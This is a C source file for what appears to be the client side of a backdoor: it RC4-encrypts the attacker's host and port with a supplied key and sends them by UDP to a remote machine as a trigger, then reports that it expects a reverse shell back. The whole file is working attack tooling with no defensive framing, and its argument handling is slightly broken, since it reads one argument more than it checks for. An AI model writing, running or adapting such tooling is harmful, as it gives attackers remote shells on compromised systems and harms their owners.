#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>

typedef struct {
    unsigned char state[256];
    unsigned char x;
    unsigned char y;
} RC4_CTX;

void rc4_init(RC4_CTX *ctx, unsigned char *key, int keylen) {
    int i;
    for (i = 0; i < 256; i++) ctx->state[i] = i;
    unsigned char j = 0;
    for (i = 0; i < 256; i++) {
        j = j + ctx->state[i] + key[i % keylen];
        unsigned char temp = ctx->state[i];
        ctx->state[i] = ctx->state[j];
        ctx->state[j] = temp;
    }
    ctx->x = 0;
    ctx->y = 0;
}

void rc4_crypt(RC4_CTX *ctx, unsigned char *data, int len) {
    int i;
    for (i = 0; i < len; i++) {
        ctx->x++;
        ctx->y += ctx->state[ctx->x];
        unsigned char temp = ctx->state[ctx->x];
        ctx->state[ctx->x] = ctx->state[ctx->y];
        ctx->state[ctx->y] = temp;
        unsigned char k = ctx->state[(ctx->state[ctx->x] + ctx->state[ctx->y]) & 0xFF];
        data[i] ^= k;
    }
}

int main(int argc, char* argv[]) {
    if (argc < 5) {
        printf("Usage: %s <RHOST> <RPORT> <RC4_KEY> <LPORT> <LHOST>\n", argv[0]);
        return 1;
    }

    struct sockaddr_in sin;
    int sin_len = sizeof(sin);
    int sock;
    int buf_len = 32;
    unsigned char buf[32];
    char payload[32];
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        perror("error opening socket");
        exit(1);
    }
    
    memset((char *)&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    
    sin.sin_port = htons(atoi(argv[2]));
    inet_aton(argv[1], &sin.sin_addr);
    
    memset(payload, 0, sizeof(payload));
    int payload_len = snprintf(payload, sizeof(payload), "X%s:%s", argv[4], argv[5]);
    if (payload_len < 0 || payload_len >= sizeof(payload)) {
        fprintf(stderr, "payload too long\n");
        close(sock);
        return 1;
    }
    
    memset(buf, 0, buf_len);
    memcpy(buf, payload, payload_len);

    RC4_CTX rc4;
    rc4_init(&rc4, (unsigned char *)argv[3], strlen(argv[3]));
    rc4_crypt(&rc4, buf, buf_len);
    
    if ((sendto(sock, buf, buf_len, 0, (struct sockaddr *)&sin, sin_len)) < 0) {
        perror("error sending data");
        close(sock);
        exit(1);
    }
    
    printf("[*] Trigger sent to %s:%s\n", argv[1], argv[2]);
    printf("[*] Expecting shell on %s:%s...\n", argv[4], argv[5]);
    
    close(sock);
    return 0;
}